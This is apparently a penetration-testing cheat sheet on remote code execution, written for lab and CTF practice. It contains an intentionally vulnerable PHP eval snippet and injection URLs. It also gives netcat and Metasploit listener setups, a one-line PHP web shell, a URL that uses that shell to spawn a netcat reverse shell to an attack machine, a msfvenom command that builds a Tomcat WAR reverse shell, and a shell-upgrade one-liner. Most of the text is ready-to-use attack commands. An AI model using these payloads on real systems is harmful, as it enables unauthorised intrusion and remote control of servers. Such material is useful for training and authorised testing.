# Remote code execution

Remote code execution \(RCE\), also known as code injection, refers to executing commands directly on the underlying operating system via the web application, in the language of the web application.

## Basic technique

The following php snippet will take the `GET` parameter `code` and run it through the `eval()` function without any input sanitization:

```text
<?php $code = $_GET['code'];
eval($code); ?>
```

The `eval()` function evaluates the contents as php code, which means we can provide any php code as an argument. The code injection would look like this:

```text
http://[host]/page.php?code=phpinfo();
```

## Remote command execution

You might also be able to execute single-line system commands like `system('id');`. For multi-line system commands, use `shell_exec`:

```text
http://[host]/page.php?code=echo shell_exec('/sbin/ifconfig eth0');
```

This method is useful for both system enumeration and shell injection. Make sure to use absolute paths for calling system files, or the web application may not find them.

## Shells
For most lab or CTF environments, the goal is to get some kind of command shell on the machine for further exploitation. Sometimes this simply means discovering SSH or remote desktop credentials and logging in. Other times, it's exploiting a web application to generate a reverse shell that connects to your attack machine and waits for instructions.

In real life I'm not sure how often reverse shells really happen, but they're fun to pull off in the lab.

If shells are a new concept, [this is a good primer](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/).

## Listeners
Your attack machine needs to have a listener running to catch a reverse shell connection. Make sure you specify the IP address of your attack machine and use a port that doesn't already have a service listening. If you need to use `python SimpleHTTPServer` or similar to transfer exploits, make sure that isn't running on the same port. 

### Netcat listener
Using ports 80 or 443 will help you get around egress filtering:
```
nc -lvp 443
```
### Meterpreter listener
You may prefer a Meterpreter listener if you're connecting to a Windows machine and want to take advantage of commands like `getsystem`, or you want to use local Metasploit exploits once you've connected to the remote machine.

Avoid using port 4444 since that is widely recognized as a Metasploit port:
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp # or whatever
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost [attack machine] # your IP address
lhost => [attack machine]
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > run
```

## Simple PHP web shell
Assuming you are able to put a file on the web server or edit an existing one (e.g. CMS template) this is the simplest type of shell:

```
<?php echo shell_exec($_GET['cmd']); ?>
```
You can use it for system commands: 
```
http://[host]/wordpress/index.php?cmd=id
```
You can also use it to create a reverse shell:
```
http://[host]/wordpress/?cmd=nc [attack machine] [port] -e /bin/sh
```
## PHP shell
This [PHP web shell from pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) is nice. Make sure to change the following variables before uploading:
```
$ip = '127.0.0.1';  # change to attack machine IP
$port = 1234;       # change to attack machine port
```
## WAR shell
If you're able to access a Tomcat server's management interface, you can generate and upload a WAR file:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[attack machine] LPORT=443 -f war > shell.war
```
You can fire the shell by clicking on the link in Tomcat's management interface, or by going to the appropriate URL (e.g. `http://[host]/shell/`)

## Upgrading shell

```
python -c 'import pty; pty.spawn("/bin/bash");'
```
